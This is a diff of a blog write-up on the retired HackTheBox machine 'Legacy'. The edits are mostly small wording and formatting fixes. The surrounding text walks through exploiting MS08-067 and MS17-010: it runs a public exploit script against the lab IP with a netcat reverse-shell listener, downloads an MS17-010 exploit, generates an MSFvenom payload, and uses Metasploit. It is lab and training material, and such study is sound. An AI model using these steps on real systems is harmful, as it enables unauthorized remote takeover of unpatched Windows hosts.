@@ -8,7 +8,7 @@ image: /assets/img/Posts/Legacy.png
 
 > Legacy from HackTheBox is an retired machine which is vulnerable to infamous MS08-067 & MS17-010 SMB vulnerabilities which can be easily exploited with publicly available scripts and Metasploit.
 
->We will use three different methods to pwn this box. First, we will use MS08-067 exploit, then MS17-010 exploit and last we will use Metasploit for automatic exploitation.
+>We will use three different methods to pwn the box. First, we will use MS08-067 exploit, then MS17-010 exploit and last we will use Metasploit for automatic exploitation.
 
 ## Reconnaissance
 
@@ -57,7 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 59.95 seconds
 ```
 
-We discovered SMB ports `139 & 445` are open and operating system running on the host is `Windows XP`.
+Looking at the output of `masscan` we discovered SMB ports `139 & 445` are open and operating system running on the host is `Windows XP`.
 
 ### Nmap SMB script
 
@@ -108,7 +108,7 @@ Host script results:
 Nmap done: 1 IP address (1 host up) scanned in 9.47 seconds
 ```
 
-We discovered the host is vulnerable to notorious `MS08`-67 (exploited widely by Conficker worm)` and `MS17-010 (by Shadow Brokers)` SMB exploits.
+We discovered the host is vulnerable to notorious SMB exploits `MS08-67 (exploited widely by Conficker worm)` and `MS17-010 (by Shadow Brokers)`.
 
 We'll exploit both vulnerabilities **MS08-67** & **MS17-010** manually sticking to OSCP pattern using publicly available exploit scripts.
 
@@ -165,14 +165,14 @@ We can replace the default shellcode given in the script with above one generate
 Looking at the usage of this exploit on line 228 we can see the exploit requires us to know the OS version and Language pack:
 
 ```console
-          print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
-          print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
-          print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
-          print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
-          print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
-          print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
-          print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
-          print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
+      print '\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0]
+      print 'Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445'
+      print 'Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)'
+      print 'Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal'
+      print 'Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English'
+      print 'Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)'
+      print 'Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)'
+      print 'Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)'
 ```
 Based on our Nmap results we know the host is running Windows XP and taking a wild guess we can try the exploit with option 6 for `Windows XP SP3 English (NX)`
 
@@ -180,7 +180,7 @@ Based on our Nmap results we know the host is running Windows XP and taking a wi
 
 Lets start the `nc` listener on port 443 and execute the exploit:
 
-```shell
+```terminal
 cfx:  ~/Documents/htb/legacy
 → /usr/bin/python2 /root/Documents/htb/legacy/ms08-067.py 10.10.10.4 6 445
 #######################################################################
@@ -240,11 +240,11 @@ type root.txt
 993442d258b0e0*****************3
 ```
 
-The fact that we could grab both the flag indicates that we are running as `NT AUTHORITY\SYSTEM`, but how do we confirm whether we are system since Windows XP doesn't have `whoami` binary.
+The fact that we could grab both the flag indicates that we are running as `NT AUTHORITY\SYSTEM`, but how do we confirm whether we are running as system since Windows XP doesn't have `whoami` binary.
 
 We can host `whoami.exe` which is by default available on kali OS inside `/usr/share/windows-binaries` on our SMB server using `Impacket's Smbserver` and run the binary on the remote host:
 
-### Sharing the SMB folder from attacking machine:
+### Sharing SMB folder from attacking machine
 
 ```shell
 cfx:  /usr/share/windows-binaries
@@ -263,7 +263,7 @@ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
 [*] :::00::4141414141414141
 ```
 
-#### Executing `Whomai.exe` binary on target machine:
+#### Executing `whomai.exe` binary on target machine:
 
 ```shell
 C:\WINDOWS\system32>\\10.10.14.14\cfx\whoami.exe
@@ -276,16 +276,16 @@ Hereby we confirm `MS08-67 exploit` gave us the shell as `NT AUTHORITY\SYSTEM`
 
 ## MS17-010
 
-For MS17-010 exploit, we will use the [**code**](https://github.com/helviojunior/MS17-010) from **helviojunior** which is fork from **worawit/MS17-010** repo.
+For MS17-010 exploit, we will use the [**code**](https://github.com/helviojunior/MS17-010) from **helviojunior** which is a fork from **worawit/MS17-010** repo.
 
-We can download the exploit using the following command:
+We can download the exploit on our machine using the following command:
 
 ```shell
 wget https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py
 ```
-This exploit is pretty straight forward as it requires an reverse shell payload file which it uploads & executes on the target machine.
+This exploit is pretty straight forward as it just requires an reverse shell payload file which it uploads & executes on the target machine.
 
-### Generating payload with MSFvenom:
+### Generating payload with MSFvenom
 
 ```shell
 cfx:  ~/Documents/htb/legacy/MS17-010
@@ -355,7 +355,8 @@ NT AUTHORITY\SYSTEM
 
 ## Metasploit
 
-Lets run Metasploit using `msfconsole` and use `exploit/windows/smb/ms08_067_netapi`, set the payload and other parameters and fire up the exploit.
+We can easily own the box using Metasploit, since it has built in exploits for both vulnerabilities.
+Lets run Metasploit using `msfconsole` and use `exploit/windows/smb/ms08_067_netapi`. Set the payload, other parameters and fire up the exploit.
 
 Similar to above two methods, we can verify if we running as system using our `whoami.exe` binary.
 
